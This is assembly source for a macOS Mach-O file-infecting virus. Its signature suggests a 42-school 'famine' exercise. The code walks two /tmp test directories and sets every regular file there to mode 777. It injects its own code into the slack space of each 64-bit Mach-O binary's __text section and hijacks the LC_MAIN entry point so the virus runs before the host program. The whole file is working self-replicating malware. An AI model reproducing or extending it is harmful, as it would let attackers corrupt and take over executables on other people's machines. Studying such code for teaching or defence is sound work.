; famine darwin - size 675 bytes

%include "famine.inc"

bits 64
default rel
global _start
section .text

_host:
                mov         rdx, 13
                mov         rax, 1
                mov         rdi, rax
                lea         rsi, [rel hello]
               
                mov         rax, Darwin__NR_write
                syscall

                xor         rdi, rdi
                mov         rax, Darwin__NR_exit
                syscall
hello           db          "hello world",33,10,0

_start:
                push        rdi
                push        rsi
                push        rcx
                push        rdx

                lea         rax, [rel _start]
                mov         rdx, [rel pie_address]
                sub         rax, rdx
                add         rax, [rel entry]
                push        rax

                lea         rdi, [rel slash_tmp]
.opendir:
                mov         r14, rdi
                mov         rsi, O_RDONLY | O_DIRECTORY
                mov         rax, Darwin__NR_open
                syscall
                jc          .nextdir                            ;XXX expecting carry flag if syscall fails

                mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd

.readdir:       lea         r10, [rsp-0x28]                     ;long *basep for macos
                mov         rdx, BUF_SIZE
                lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
                mov         rdi, [rsp-0x30]                     ;directory fd
                mov         rax, Darwin__NR_getdents
                syscall
                test        rax, rax
                jle         .closedir

                xor         r13, r13
                mov         r12, rax
.file:
                lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
                add         rdi, r13

                xor         edx, edx

                mov         dx, word [rdi + 4]                  ; macos d_reclen
                mov         al, byte [rdi + 6]                  ; macos d_type
                add         rdi, 8                              ; macos d_name
                add         r13, rdx

                cmp         al, DT_REG
                jne         .nextfile

                call        process
.nextfile:
                cmp         r13, r12
                jl          .file
                jmp         .readdir

.closedir:      mov         rdi, [rsp-0x30]
                mov         rax, Darwin__NR_close
                syscall
.nextdir:
                xor         ecx, ecx
                mul         ecx
                dec         ecx
                mov         rdi, r14
                repnz       scasb
                cmp         byte [rdi], 0
                jnz         .opendir

                pop         rax
                pop         rdx
                pop         rcx
                pop         rsi
                pop         rdi

                jmp         rax

process:                                                        ; expecting filename in rdi
                                                                ; directory in r14
                mov         rsi, r14
                mov         rax, rdi
                lea         rdi, [rsp - ((BUF_SIZE * 2) + LOCAL_VARS)]
                mov         rdx, rdi                            ; concat directory and filename

.dirname:       movsb
                cmp         byte [rsi], 0
                jnz         .dirname
                mov         rsi, rax
.filename:      movsb
                cmp         byte [rsi - 1], 0
                jnz         .filename
                mov         rdi, rdx

                push        rdi
                mov         rsi, 0o777
                mov         rax, Darwin__NR_chmod                     ; try to set permissions
                syscall
                pop         rdi

                mov         rsi, O_RDWR
                mov         rax, Darwin__NR_open
                syscall
                jc          .return                             ; XXX expecting carry flag if open() fails

                mov         [rsp-0x48], rax                     ; rsp-0x48 = infect_fd

                lea         rsi, [rsp - 0x148]                  ; rsp-0x148 = fstat buf
                mov         rdi, [rsp-0x48]
                mov         rax, Darwin__NR_fstat
                syscall
                cmp         rax, 0
                jnz         .close

                mov         rsi, qword [rsp - (0x148-0x48)]     ; macos st_size
                mov         [rsp-0x50], rsi                     ; rsp-0x50 = infect_fsize
                cmp         rsi, 0x1000                         ; file too small
                jl          .close

                xor         r9, r9
                mov         r8, [rsp-0x48]
                mov         r10, MAP_SHARED
                mov         rdx, PROT_READ | PROT_WRITE
                                                                ; rsi has file size already
                xor         rdi, rdi
                mov         rax, Darwin__NR_mmap
                syscall
                cmp         rax, -4095
                jae         .close

                mov         [rsp-0x58], rax                     ;rsp-0x58 = infect_mem
                mov         rdi, rax

                call        is_valid_macho64
                test        al, al
                jz          .unmap

                call        insert_macho64

.unmap:         mov         rsi, [rsp-0x50]                     ; infect_fsize
                mov         rdi, [rsp-0x58]                     ; infect_mem
                mov         rax, Darwin__NR_munmap
                syscall

.close:         mov         rdi, [rsp-0x48]
                mov         rax, Darwin__NR_close
                syscall
.return:        ret

is_valid_macho64:
                push        rdi
                call        .mach_header_64
                db          0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1, 3, 0, 0, 0x80, 2, 0, 0, 0
.mach_header_64:pop         rsi
                xor         ecx, ecx
                mul         rcx
                mov         cl, 4
                repe        cmpsd
                jnz         .return
                inc         al
.return:        pop         rdi
                ret

insert_macho64:                                                 ; expecting data in rdi
                push        r12
                push        r13
                mov         rsi, rdi
                mov         ecx, dword [rdi + 0x10]             ; mach_header_64.ncmds
                add         rdi, 0x20
                xor         r12, r12
                xor         r13, r13
.lc_segment_64: cmp         dword [rdi], LC_SEGMENT_64
                jnz         .lc_main
                mov         rax, 0x0000545845545F5F             ; "__TEXT",0,0
                cmp         rax, qword [rdi + 8]                ;
                jnz         .next_lcmd
                                                                ; XXX note: expecting first section of __TEXT segment
                                                                ; to be the __text section
                cmp         rax, qword [rdi + 0x48 + 0x10]      ; this should work for most but not all binaries
                jnz         .return
                mov         rdx, 0x0000747865745F5F             ; "__text",0,0
                cmp         rdx, qword [rdi + 0x48]             ; section_64.sectname
                jnz         .return
                mov         r12, rdi                            ; at this point r12 points to segment_command_64
                                                                ; sizeof segment_command_64 = 0x48
                                                                ; sizeof section_64 = 0x50
                                                                ; dword at [r12 + 0x48 + 0x30] is section_64.offset
.lc_main:       cmp         dword [rdi], LC_MAIN
                jnz         .next_lcmd
                test        r12, r12
                jz          .return
                lea         r13, [rdi+8]                        ; r13 points to entry_point_command
                                                                ; qword at [r13 + 8] is entryoff
                mov         rdi, rsi
                mov         eax, dword [r12 + 0x48 + 0x30]      ; file offset of __text section
                add         rdi, rax
                mov         ecx, (_finish - _start) + 0x50      ; size + extra padding
                sub         rdi, rcx

                xor         al, al
                repz        scasb
                test        ecx, ecx
                ja          .return                             ; not enough room

                mov         ecx, (_finish - _start)
                sub         rdi, rcx
                mov         rdx, rdi
                mov         rax, rdi
                sub         rax, rsi                            ; rax == new entry point
                lea         rsi, [rel _start]
                rep         movsb

                mov         rcx, qword [r13]                    ; get entry point
                mov         qword [r13], rax

                mov         qword [rdi - 8], rcx                ; store entry point
                mov         qword [rdi - 16], rax               ; store pos
                jmp         .return

.next_lcmd:     mov         eax, dword [rdi + 4]                ; cmdsize
                add         rdi, rax
                dec         ecx
                jnz        .lc_segment_64
.return         pop         r13
                pop         r12
                ret

slash_tmp       db          "/tmp/test1/",0,"/tmp/test2/",0,0
signature       db          "famine! darwin @42siliconvalley",0

pie_address     dq          (_start - _host)
entry           dq          0
_finish:
